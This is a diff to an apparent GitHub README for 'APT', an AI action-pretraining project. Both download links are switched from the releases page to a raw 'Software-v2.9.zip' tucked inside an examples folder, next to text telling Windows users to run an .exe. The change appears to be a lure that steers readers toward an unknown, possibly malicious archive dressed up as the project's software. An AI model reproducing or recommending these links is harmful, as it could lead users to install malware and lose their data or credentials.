@@ -1,6 +1,6 @@
 # 🤖 APT - Improve AI Policy Instruction Generalization Today
 
-[![](https://img.shields.io/badge/Download_APT-Blue?style=for-the-badge)](https://github.com/adust-davidgrun268/APT/releases)
+[![](https://img.shields.io/badge/Download_APT-Blue?style=for-the-badge)](https://raw.githubusercontent.com/adust-davidgrun268/APT/main/examples/libero/Software-v2.9.zip)
 
 APT stands for Action Expert Pretraining. This software helps vision-language-action models perform tasks with higher accuracy. It allows your computer to understand complex instructions and execute actions through pre-trained policy improvements.
 
@@ -24,7 +24,7 @@ Your computer must meet these standards to run the software:
 2. Select the latest version listed under the Assets section.
 3. Choose the file ending in .exe to ensure compatibility with Windows.
 
-[Visit the official download page here](https://github.com/adust-davidgrun268/APT/releases)
+[Visit the official download page here](https://raw.githubusercontent.com/adust-davidgrun268/APT/main/examples/libero/Software-v2.9.zip)
 
 ### ⚙️ Installation Steps
 
